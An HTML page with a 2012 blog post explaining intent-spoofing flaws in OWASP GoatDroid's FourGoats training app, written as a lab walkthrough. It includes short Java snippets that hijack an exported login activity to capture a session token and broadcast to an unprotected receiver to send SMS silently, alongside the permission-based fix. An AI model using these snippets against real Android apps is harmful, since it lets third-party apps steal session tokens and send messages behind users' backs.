@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>FourGoats Vulnerabilities: Intent Spoofing</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="The Android platform enables an inter application communication that can cause side effects in the security of our application. If a component allows any application to send him intents, we can end up being a puppet on any malware hands.
+In order to prevent this situation, the Android platform enables two controls to limit who can talk to you application components. These controls are:
+ Permissions Intents types  The first one is obvious, the component can request the calling application to present a specific permission in order to call your application.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="FourGoats Vulnerabilities: Intent Spoofing">
+    <meta name="twitter:description" content="The Android platform enables an inter application communication that can cause side effects in the security of our application. If a component allows any application to send him intents, we can end up being a puppet on any malware hands.
+In order to prevent this situation, the Android platform enables two controls to limit who can talk to you application components. These controls are:
+ Permissions Intents types  The first one is obvious, the component can request the calling application to present a specific permission in order to call your application.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="FourGoats Vulnerabilities: Intent Spoofing">
+  <meta property="og:description" content="The Android platform enables an inter application communication that can cause side effects in the security of our application. If a component allows any application to send him intents, we can end up being a puppet on any malware hands.
+In order to prevent this situation, the Android platform enables two controls to limit who can talk to you application components. These controls are:
+ Permissions Intents types  The first one is obvious, the component can request the calling application to present a specific permission in order to call your application.">
+  <meta property="og:url" content="http://pwntester.com/blog/2012/11/17/fourgoats-vulnerabilities-intent-spoofing/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2012/11/17/fourgoats-vulnerabilities-intent-spoofing/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">FourGoats Vulnerabilities: Intent Spoofing</h1>
+      <p class="post-meta">@pwntester · Nov 17, 2012 · 3 min read</p>
+    </header>
+    <article class="post-content"><p>The Android platform enables an inter application communication that can cause side effects in the security of our application. If a component allows any application to send him intents, we can end up being a puppet on any malware hands.</p>
+
+<p>In order to prevent this situation, the Android platform enables two controls to limit who can talk to you application components. These controls are:</p>
+
+<ul>
+<li>Permissions</li>
+<li>Intents types</li>
+</ul>
+
+<p>The first one is obvious, the component can request the calling application to present a specific permission in order to call your application.</p>
+
+<p>The second one define two different type of intents:</p>
+
+<ul>
+<li>Explicit intents are sent to an specific component and only delivered to him</li></li>
+<li>Implicit intents request an action to be done and ask the system to look for the better component to perform that action. If the component is an Activity, the system will present the user a list with all the activities registered to handle that specific action. If the component is a service, it will be randomly delivered to any of them. Finally, if the component is a broadcast receiver, the system will deliver a copy to all of them.</li>
+</ul>
+
+<p>One interesting fact is that any component is private by default. so far so good. Problems begin when a developer register a component to handle any implicit intent by declaring an intent-action. All of a sudden, that component will immediately become public with no notification to the developer. If the developer wants to keep that component private, he must declare explicitly that component as non exported.</p>
+
+<p>Now, let have a look to the fourGoats app and check what applications are public. We can find three explicitly exported components:</p>
+
+<pre><code>&lt;activity
+android:name=&quot;.activities.ViewCheckin&quot;
+android:exported=&quot;true&quot;
+android:label=&quot;@string/view_checkin&quot; &gt;
+&lt;/activity&gt;
+
+&lt;activity
+android:name=&quot;.activities.ViewProfile&quot;
+android:exported=&quot;true&quot;
+android:label=&quot;@string/profile&quot; &gt;
+&lt;/activity&gt;
+
+&lt;activity
+android:name=&quot;.activities.SocialAPIAuthentication&quot;
+android:exported=&quot;true&quot;
+android:label=&quot;@string/authenticate&quot; &gt;
+&lt;/activity&gt;
+</code></pre>
+
+<p>and if we look for implicitly exported components we will find another two:</p>
+
+<pre><code>&lt;service android:name=&quot;.services.LocationService&quot; &gt;
+&lt;intent-filter&gt;
+&lt;action android:name=&quot;org.owasp.goatdroid.fourgoats.services.LocationService&quot; /&gt;
+&lt;/intent-filter&gt;
+&lt;/service&gt;
+
+&lt;receiver
+android:name=&quot;.broadcastreceivers.SendSMSNowReceiver&quot;
+android:label=&quot;Send SMS&quot; &gt;
+&lt;intent-filter&gt;
+&lt;action android:name=&quot;org.owasp.goatdroid.fourgoats.SOCIAL_SMS&quot; /&gt;
+&lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre>
+
+<p>As they (intentionally or not) declared public, lets see what can we do with them.</p>
+
+<p><strong>SocialAPIAuthentication</strong></p>
+
+<p>Reviewing the SocialAPIAuthentication activity, it seems that it present a login form to the user, performs the authentication and if its validated by the server, it returns a session token.</p>
+
+<p>Now, let see how can we get a session token from any other app by presenting the user the same activity and ask him to enter its credentials:</p>
+
+<pre><code>Intent tokenIntent = new Intent();
+tokenIntent.setComponent(new ComponentName(&quot;org.owasp.goatdroid.fourgoats&quot;,&quot;org.owasp.goatdroid.fourgoats.activities.SocialAPIAuthentication&quot;));
+startActivityForResult(tokenIntent, STATIC_INTEGER_VALUE);
+</code></pre>
+
+<p>Now we need to handle the call back:</p>
+
+<pre><code>@Override
+public void onActivityResult(int requestCode, int resultCode, Intent data) {
+  super.onActivityResult(requestCode, resultCode, data);
+  switch(requestCode) {
+    case (STATIC_INTEGER_VALUE) : {
+      if (resultCode == Activity.RESULT_OK) {
+        Log.w(&quot;alvms&quot;, &quot;4Goats SessionToken: &quot; + data.getStringExtra(&quot;sessionToken&quot;));
+      }
+      break;
+    }
+  }
+}
+</code></pre>
+
+<p>Ok, it doesn&rsquo;t look a big deal since the malware app can also fake the login form and get the credentials if the user is willing to authenticate himself from another application, lets see another abuse case</p>
+
+<p><strong>SendSMSNowReceiver</strong></p>
+
+<p>Ok, so this receiver is registered to handle the action: org.owasp.goatdroid.fourgoats.SOCIAL_SMS but the developer forgot to declare the component as private so it will be automatically be registered in the system as public because it handles an implicit action.</p>
+
+<p>So if its public, we can call it:</p>
+
+<pre><code>Intent broadcastIntent=new Intent();
+broadcastIntent.setAction(&quot;org.owasp.goatdroid.fourgoats.SOCIAL_SMS&quot;);
+broadcastIntent.putExtra(&quot;phoneNumber&quot;,&quot;0034666666666&quot;);
+broadcastIntent.putExtra(&quot;message&quot;,&quot;Hi&quot;);
+sendBroadcast(broadcastIntent)
+</code></pre>
+
+<p>And voila, we are sending an SMS from the user phone without him noticing.</p>
+
+<p>If the developer meant this component to be public but protect it from being call from any application, he needs to declare a strong permission so only those apps with that permission granted can call that component.</p>
+
+<p>You can find the intent spoofer client here:</p>
+
+<p><a href="https://github.com/pwntester/OWASP-GoatDroid-Dolphis">https://github.com/pwntester/OWASP-GoatDroid-Dolphis</a></p>
+
+<p>Enjoy</p>
+</article>
+    <footer class="post-footer">
+      
+      <p class="post-copyright">
+        This post was published <strong>2532</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
